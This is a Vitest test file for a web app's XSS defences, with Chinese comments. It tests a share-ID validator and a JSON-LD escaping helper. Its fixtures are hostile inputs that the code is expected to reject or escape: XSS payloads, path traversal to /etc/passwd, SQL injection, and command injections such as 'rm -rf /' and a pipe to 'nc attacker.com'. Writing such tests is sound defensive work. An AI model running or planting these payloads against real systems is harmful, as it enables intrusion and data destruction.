/**
 * XSS 安全测试
 * 测试 dangerouslySetInnerHTML 使用场景的安全性
 */

import { isJsonLdSafe, safeJsonLdReplacer } from '@/lib/security/json-ld';
import { describe, expect, it } from 'vitest';

/**
 * 分享页面 ID 验证函数
 * 只允许字母、数字和短横线
 */
function validateShareId(id: string): boolean {
  if (!id || typeof id !== 'string') {
    return false;
  }
  return /^[a-zA-Z0-9-]+$/.test(id);
}

// 删除错误的辅助函数 - JSON.stringify 不会转义 </script> 等危险内容
// 使用项目提供的 safeJsonLdReplacer 和 isJsonLdSafe

describe('XSS Prevention - Share Page ID Validation', () => {
  describe('validateShareId - Valid IDs', () => {
    it('should accept alphanumeric IDs', () => {
      const validIds = ['abc123', 'ABC123', 'abc', '123', 'aBc123'];

      validIds.forEach((id) => {
        expect(validateShareId(id)).toBe(true);
      });
    });

    it('should accept IDs with hyphens', () => {
      const validIds = [
        'share-123',
        'abc-def-ghi',
        '123-456-789',
        'user-share-2024',
        'a-b-c',
      ];

      validIds.forEach((id) => {
        expect(validateShareId(id)).toBe(true);
      });
    });

    it('should accept typical UUID-like IDs', () => {
      const validIds = [
        'a1b2c3d4-e5f6-g7h8-i9j0-k1l2m3n4o5p6',
        '550e8400-e29b-41d4-a716-446655440000',
      ];

      validIds.forEach((id) => {
        expect(validateShareId(id)).toBe(true);
      });
    });
  });

  describe('validateShareId - XSS Attempts', () => {
    it('should block script tag injections', () => {
      const maliciousIds = [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        'abc<script>alert(1)</script>',
        '<script src="evil.js"></script>',
        '</script><script>alert(1)</script>',
      ];

      maliciousIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });

    it('should block HTML tag injections', () => {
      const maliciousIds = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<div onclick="alert(1)">',
        '<a href="javascript:alert(1)">',
      ];

      maliciousIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });

    it('should block JavaScript protocol handlers', () => {
      const maliciousIds = [
        'javascript:alert(1)',
        'javascript:void(0)',
        'data:text/html,<script>alert(1)</script>',
      ];

      maliciousIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });

    it('should block special characters used in XSS', () => {
      const maliciousIds = [
        'id"onclick="alert(1)"',
        "id'onerror='alert(1)'",
        'id;alert(1);',
        'id&lt;script&gt;alert(1)',
        'id%3Cscript%3Ealert(1)',
      ];

      maliciousIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });

    it('should block path traversal attempts', () => {
      const maliciousIds = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'id/../../secret',
        'id/../admin',
      ];

      maliciousIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });

    it('should block SQL injection attempts', () => {
      const maliciousIds = [
        "id' OR '1'='1",
        'id"; DROP TABLE users; --',
        "id' UNION SELECT * FROM users--",
      ];

      maliciousIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });

    it('should block command injection attempts', () => {
      const maliciousIds = [
        'id; rm -rf /',
        'id && cat /etc/passwd',
        'id | nc attacker.com 1234',
        'id`whoami`',
        'id$(whoami)',
      ];

      maliciousIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });

    it('should block encoded payloads', () => {
      const maliciousIds = [
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
      ];

      maliciousIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });
  });

  describe('validateShareId - Edge Cases', () => {
    it('should reject empty strings', () => {
      expect(validateShareId('')).toBe(false);
    });

    it('should reject null and undefined', () => {
      expect(validateShareId(null as any)).toBe(false);
      expect(validateShareId(undefined as any)).toBe(false);
    });

    it('should reject non-string types', () => {
      expect(validateShareId(123 as any)).toBe(false);
      expect(validateShareId({} as any)).toBe(false);
      expect(validateShareId([] as any)).toBe(false);
    });

    it('should reject strings with spaces', () => {
      expect(validateShareId('abc 123')).toBe(false);
      expect(validateShareId(' abc123')).toBe(false);
      expect(validateShareId('abc123 ')).toBe(false);
    });

    it('should reject strings with special characters', () => {
      const invalidIds = [
        'abc@123',
        'abc#123',
        'abc$123',
        'abc%123',
        'abc^123',
        'abc&123',
        'abc*123',
        'abc(123)',
        'abc[123]',
        'abc{123}',
        'abc|123',
        'abc\\123',
        'abc/123',
        'abc:123',
        'abc;123',
        'abc"123',
        "abc'123",
        'abc<123>',
        'abc?123',
        'abc!123',
        'abc~123',
        'abc`123',
        'abc+123',
        'abc=123',
      ];

      invalidIds.forEach((id) => {
        expect(validateShareId(id)).toBe(false);
      });
    });
  });
});

describe('XSS Prevention - JSON-LD Safety', () => {
  describe('JSON.stringify 默认不转义危险内容', () => {
    it('should demonstrate that plain JSON.stringify is UNSAFE', () => {
      const data = {
        content: '</script><script>alert("XSS")</script>',
      };

      const json = JSON.stringify(data);

      // 警告：JSON.stringify 不会转义 </script>，这是 XSS 漏洞！
      expect(json).toContain('</script>');
      expect(isJsonLdSafe(data)).toBe(false);
    });

    it('should demonstrate HTML comment vulnerability', () => {
      const data = {
        comment: '<!-- malicious -->',
      };

      const json = JSON.stringify(data);

      expect(json).toContain('<!--');
      expect(isJsonLdSafe(data)).toBe(false);
    });
  });

  describe('safeJsonLdReplacer protects against XSS', () => {
    it('should escape script tag closures', () => {
      const data = {
        content: '</script><script>alert("XSS")</script>',
      };

      const safe = safeJsonLdReplacer(data);

      // 应该将 </script> 转义为 <\/script>
      expect(safe).not.toContain('</script>');
      expect(safe).toContain('<\\/script>');
    });

    it('should escape HTML comments', () => {
      const data = {
        comment: '<!-- malicious content -->',
      };

      const safe = safeJsonLdReplacer(data);

      expect(safe).not.toContain('<!--');
      expect(safe).toContain('<\\!--');
    });

    it('should handle mixed case script tags', () => {
      const data = {
        text: '</ScRiPt><sCrIpT>alert(1)</script>',
      };

      const safe = safeJsonLdReplacer(data);

      // 大小写不敏感匹配：所有 </script> 和 <script> 都应被转义
      expect(safe).not.toMatch(/<\/script/i);
      expect(safe).not.toMatch(/<script/i);
      // 验证转义后的结果
      expect(safe).toContain('<\\/script>');
      expect(safe).toContain('<\\script>');
    });

    it('should handle nested objects with malicious content', () => {
      const data = {
        user: {
          name: '<script>alert(1)</script>',
          bio: '</script><img src=x onerror=alert(1)>',
        },
      };

      const safe = safeJsonLdReplacer(data);
      expect(safe).not.toContain('</script>');
      expect(safe).toContain('<\\/script>');
    });

    it('should handle arrays with malicious content', () => {
      const data = [
        '</script><script>alert(1)</script>',
        '<!-- comment -->',
        '<img src=x onerror=alert(1)>',
      ];

      const safe = safeJsonLdReplacer(data);
      expect(safe).not.toContain('</script>');
      expect(safe).not.toContain('<!--');
    });
  });

  describe('safeJsonLdReplacer with real-world scenarios', () => {
    it('should safely handle user-generated content', () => {
      const userContent = {
        comment:
          'Check this out: </script><script>alert(document.cookie)</script>',
        name: '"><img src=x onerror=alert(1)>',
        url: 'javascript:void(0)',
      };

      const safe = safeJsonLdReplacer(userContent);

      // </script> 应该被转义
      expect(safe).not.toContain('</script>');
      expect(safe).toContain('<\\/script>');
    });

    it('should safely handle Schema.org data', () => {
      const schema = {
        '@context': 'https://schema.org',
        '@type': 'Organization',
        name: 'Company </script><script>alert(1)</script>',
        description: 'A great company <!-- comment -->',
      };

      const safe = safeJsonLdReplacer(schema);
      expect(safe).not.toContain('</script>');
      expect(safe).not.toContain('<!--');
    });

    it('should safely handle analytics data', () => {
      const analyticsData = {
        event: 'page_view',
        page: '/test</script><script>alert(1)</script>',
        user_id: '"><img src=x onerror=alert(1)>',
      };

      const safe = safeJsonLdReplacer(analyticsData);
      expect(safe).not.toContain('</script>');
    });
  });
});

describe('XSS Prevention - Integration Tests', () => {
  it('should provide defense-in-depth for share page', () => {
    const maliciousId = '</script><script>alert(1)</script>';

    // 第一层防御：ID 验证应该阻止
    expect(validateShareId(maliciousId)).toBe(false);

    // 第二层防御：使用 safeJsonLdReplacer 转义
    const script = `const id = ${safeJsonLdReplacer(maliciousId)};`;
    expect(script).not.toContain('</script>');
    expect(script).toContain('<\\/script>');
  });

  it('should handle edge case where ID passes validation', () => {
    const validId = 'abc123';

    // 第一层：通过验证
    expect(validateShareId(validId)).toBe(true);

    // 第二层：safeJsonLdReplacer 正常处理
    const script = `const id = ${safeJsonLdReplacer(validId)};`;
    expect(script).toBe('const id = "abc123";');
  });

  it('should test complete share page flow', () => {
    const testCases = [
      { id: 'valid-id-123', shouldPass: true },
      { id: '</script><script>alert(1)</script>', shouldPass: false },
      { id: 'id"; alert(1); //', shouldPass: false },
      { id: '../../../etc/passwd', shouldPass: false },
    ];

    testCases.forEach(({ id, shouldPass }) => {
      const isValid = validateShareId(id);
      expect(isValid).toBe(shouldPass);

      if (shouldPass) {
        // 如果通过验证，使用 safeJsonLdReplacer 保证安全
        const script = `const id = ${safeJsonLdReplacer(id)};`;
        expect(script).toBeTruthy();
      }
    });
  });
});

describe('XSS Prevention - Performance', () => {
  it('should validate IDs quickly', () => {
    const start = performance.now();

    for (let i = 0; i < 10000; i++) {
      validateShareId(`valid-id-${i}`);
    }

    const duration = performance.now() - start;

    // 10000 次验证应该在 100ms 内完成
    expect(duration).toBeLessThan(100);
  });

  it('should handle large IDs efficiently', () => {
    const largeId = 'a'.repeat(1000);

    const start = performance.now();
    validateShareId(largeId);
    const duration = performance.now() - start;

    // 单次验证应该在 1ms 内完成
    expect(duration).toBeLessThan(1);
  });
});
